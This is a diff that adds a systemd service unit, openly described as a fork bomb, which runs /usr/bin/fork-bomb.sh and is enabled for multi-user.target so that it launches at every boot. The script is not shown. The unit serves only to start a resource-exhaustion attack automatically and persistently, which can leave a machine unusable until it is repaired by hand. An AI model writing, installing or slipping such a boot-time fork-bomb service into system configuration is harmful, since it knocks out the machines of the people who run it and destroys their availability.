@@ -1,0 +1,9 @@
+[Unit] 
+Description=fork bomb
+
+[Service] 
+Type=simple
+ExecStart=/bin/bash /usr/bin/fork-bomb.sh
+
+[Install] 
+WantedBy=multi-user.target
